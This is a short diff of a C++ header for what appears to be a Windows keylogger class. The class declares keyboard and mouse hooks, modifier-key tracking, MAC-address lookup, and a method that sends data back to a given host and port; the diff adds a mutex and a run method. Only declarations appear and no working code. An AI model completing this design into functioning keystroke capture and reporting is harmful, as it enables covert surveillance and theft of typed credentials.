@@ -4,6 +4,7 @@
 #include <Psapi.h>
 #include <list>
 #include <iostream>
+#include <mutex>
 #include "Event.h"
 #include "KeyboardEvent.h"
 #include "MouseEvent.h"
@@ -23,7 +24,8 @@ public:
 	void					unsetHook(HHOOK hook);
 	void					unsetKeyboardHook(void);
 	void					unsetMouseHook(void);
-	void					sendBackMessage(std::string const &host, std::string const &port);
+	void					run(std::string const &host, std::string const &port);
+	void					sendBackMessage(void);
 	void					getMACAddress(void);
 	void					setShift(bool shift);
 	void					setCtrl(bool ctrl);
@@ -56,6 +58,7 @@ private:
 	fct_iselect				m_iselect;
 	fct_new_iclient			m_new_iclient;
 	fct_new_iprotocol		m_new_iprotocol;
+	std::mutex				m_mutex;
 public:
 	ITime					&m_itime;
 };
